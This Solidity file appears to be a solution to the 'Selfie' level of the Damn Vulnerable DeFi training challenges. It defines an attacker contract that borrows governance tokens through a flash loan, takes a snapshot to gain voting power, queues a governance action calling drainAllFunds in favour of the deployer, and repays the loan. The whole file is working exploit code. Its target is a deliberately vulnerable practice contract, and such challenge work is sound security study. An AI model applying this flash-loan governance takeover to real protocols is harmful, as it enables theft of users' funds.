pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SimpleGovernance simpleGov;
    uint public actionId;

    address deployer;

    function attack(
        SelfiePool _selfiePool,
        SimpleGovernance _simpleGov,
        uint amount
    ) external {
        simpleGov = _simpleGov;
        deployer = msg.sender;

        _selfiePool.flashLoan(amount);
    }

    function receiveTokens(DamnValuableTokenSnapshot _token, uint) external {
        _token.snapshot();
        actionId = simpleGov.queueAction(
            msg.sender,
            abi.encodeWithSignature("drainAllFunds(address)", deployer),
            0
        );

        _token.transfer(address(msg.sender), _token.balanceOf(address(this)));
    }
}
